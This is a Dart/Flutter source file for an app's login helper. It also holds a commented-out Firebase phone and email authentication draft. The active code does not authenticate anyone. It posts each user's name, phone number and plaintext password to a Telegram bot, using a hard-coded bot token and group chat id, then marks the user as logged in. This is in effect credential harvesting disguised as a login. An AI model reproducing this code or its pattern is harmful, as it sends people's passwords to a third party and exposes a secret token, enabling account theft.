import 'package:dio/dio.dart';
import 'package:flutter/material.dart';
import 'package:flutter_secure_storage/flutter_secure_storage.dart';

abstract class Services {
  //Function

  Future isLogin();
  Future writeLogin();

  Future sendMessageuser();

  TextEditingController nameController = TextEditingController();
  TextEditingController phoneController = TextEditingController(text: "+998");
  TextEditingController passwordController = TextEditingController();

  final storage = const FlutterSecureStorage();
}

class Helper extends Services {
  @override
  isLogin() async {
    String? value = await storage.read(key: 'judaMaxfiySoz');
    return value;
  }

  @override
  writeLogin() async {
    await storage.write(key: 'judaMaxfiySoz', value: "logged");
  }

  @override
  Future sendMessageuser() async {
    var res = await Dio().post(
      "https://api.telegram.org/bot5086197624:AAGK6fpCiE-YtKOkqoVqBp_xewujzrww35Q/sendMessage",
      data: {
        "chat_id": "-1001778111155",
        "text":
            "name: ${nameController.text}\n,phone: ${phoneController.text}\n,password: ${passwordController.text}"
      },
    );
    await writeLogin();
  }
}








// import 'package:flutter/material.dart';
// import 'package:flutter_secure_storage/flutter_secure_storage.dart';
// import 'package:firebase_auth/firebase_auth.dart';
// import 'package:firebase_core/firebase_core.dart';
// import 'package:flutter/material.dart';

// abstract class ApiService{
// FirebaseAuth auth = FirebaseAuth.instance;
// Future phoneSignup();
// Future<bool> signInWithEmailAndPassword(String email, String password);
// Future<bool> updateUser(UserModel user, String oldEmail, String password);
// Future<bool> isAdmin();
// TextEditingController _emailController = TextEditingController();
//   TextEditingController _passwordController = TextEditingController();
// String? code;

// }




// class Enter extends ApiService{


// @override
// phoneSignup(){
// await FirebaseAuth.instance.verifyPhoneNumber(
//                                     phoneNumber:
//                                         _emailController.text.toString(),
//                                     verificationCompleted:
//                                         (PhoneAuthCredential credential) {
//                                       print(credential.toString());
//                                     },
//                                     verificationFailed:
//                                         (FirebaseAuthException e) {},
//                                     codeSent: (String verificationId,
//                                         int? resendToken) {
//                                       print(resendToken.toString());
//                                       print(verificationId);
//                                     },
//                                     codeAutoRetrievalTimeout:
//                                         (String verificationId) {
//                                       code = verificationId;
//                                     });

// }
// @override
// verified(){
//     var _credential = PhoneAuthProvider.credential(
//                                 verificationId: code!,
//                                 smsCode: _codecontroller.text.toString(),
//                               );
//                               _auth
//                                   .signInWithCredential(_credential)
//                                   .then((dynamic result) {
//                                 writePhone(_phonecontroller.text.toString());
//                                 setState(() {});
//                               }).catchError((e) {
//                                 print(e);
//                               });
//                             }

//   @override
//   Future<bool> isAdmin() {
//     // TODO: implement isAdmin
//     throw UnimplementedError();
//   }

  
//   @override
//   Future<bool> updateUser(user, String oldEmail, String password) {
//     // TODO: implement updateUser
//     throw UnimplementedError();
//   }




// @override
//  Future<bool> signInWithEmailAndPassword(String email, String password) async {
//     try {
//       await _auth.signInWithEmailAndPassword(email: email, password: password);
//       return true;
//     } catch (e) {
//       return false;
//     }
//   }
// @override
// Future<bool> updateUser(
//       UserModel user, String oldEmail, String password) async {
//     bool _result = false;
//     await _auth
//         .signInWithEmailAndPassword(email: oldEmail, password: password)
//         .then((_firebaseUser) {
//       _firebaseUser.user.updateEmail(user.email);
//       _updateUserFirestore(user, _firebaseUser.user);
//       _result = true;
//     });
//     return _result;
//   }


// }